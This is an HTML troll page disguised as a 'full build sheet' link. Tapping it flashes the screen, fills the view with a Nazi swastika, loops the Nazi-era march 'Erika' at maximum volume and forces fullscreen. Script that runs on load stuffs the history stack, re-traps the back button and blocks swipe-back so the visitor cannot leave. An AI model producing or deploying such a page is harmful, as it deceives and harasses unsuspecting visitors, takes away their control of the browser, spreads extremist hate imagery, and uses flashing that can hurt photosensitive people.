<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auf der Heide blüht ein kleines Blümchen...</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            overflow: hidden; 
            font-family: Arial, sans-serif; 
            background-color: black; /* Initial black background */
            transition: background-color 0.1s; /* For flash effect */
        }
        audio { display: none; }
        #bait-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black; /* Fully black overlay */
            color: white;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 999;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="bait-overlay">Tap for full build sheet</div>
    <audio id="erika" loop>
        <source src="https://upload.wikimedia.org/wikipedia/commons/2/2b/Erika_%28Marching_Song_of_the_German_Military%29.ogg" type="audio/ogg">
        <source src="https://archive.org/download/ERIKA_201803/ERIKA.mp3" type="audio/mpeg"> <!-- Fallback -->
        Your browser hates fun.
    </audio>
    <script>
        const audio = document.getElementById('erika');
        const overlay = document.getElementById('bait-overlay');
        
        // Set up click/tap listener for "interaction"
        overlay.addEventListener('click', () => {
            overlay.style.display = 'none'; // Hide bait
            
            // Quick flash: Set to white for 100ms
            document.body.style.backgroundColor = 'white';
            setTimeout(() => {
                // Then reveal swastika
                document.body.style.backgroundColor = 'white';
                document.body.style.backgroundImage = 'url("https://upload.wikimedia.org/wikipedia/commons/9/9c/Nazi_Swastika.svg")';
                document.body.style.backgroundRepeat = 'no-repeat';
                document.body.style.backgroundPosition = 'center center';
                document.body.style.backgroundAttachment = 'fixed';
                document.body.style.backgroundSize = 'cover';
                document.body.style.webkitBackgroundSize = 'cover';
                document.body.style.mozBackgroundSize = 'cover';
                document.body.style.oBackgroundSize = 'cover';
            }, 100);
            
            audio.volume = 1.0; // Max volume
            audio.play().catch(e => console.log('Play failed after tap? Weird.')); // Should work now
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {}); // Go fullscreen
            }
        });
        
        // Infinite history push starts immediately to trap back button from the start
        let historyCount = 0;
        const trapInterval = setInterval(() => {
            if (historyCount < 100) { // Stack 'em up
                history.pushState({page: 'erika'}, '', window.location.href);
                historyCount++;
            }
        }, 100);
        
        // Catch back/forward and reload to self
        window.addEventListener('popstate', (e) => {
            if (e.state && e.state.page === 'erika') {
                history.pushState({page: 'erika'}, '', window.location.href);
                audio.currentTime = 0; // Restart for extra salt
                audio.play();
            }
        });
        
        // Prevent swipe-back on mobile (iOS/Android)
        document.addEventListener('touchstart', (e) => {
            if (e.touches.length > 1) e.preventDefault(); // Multi-touch block
        });
        let touchStartX = 0;
        document.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; });
        document.addEventListener('touchend', (e) => {
            const touchEndX = e.changedTouches[0].screenX;
            if (touchStartX - touchEndX > 50) { // Swipe left (back)
                e.preventDefault();
                history.pushState(null, '', window.location.href);
                audio.play();
            }
        });
        
        // Loop fallback if not natively looping
        audio.addEventListener('ended', () => { audio.play(); });
        
        // Orientation change: louder + flash (if possible)
        window.addEventListener('orientationchange', () => {
            setTimeout(() => { audio.volume = 1.0; audio.play(); }, 500);
            document.body.style.backgroundColor = 'red'; // Quick flash over background
            setTimeout(() => { document.body.style.backgroundColor = 'white'; }, 100);
        });
    </script>
</body>
</html>
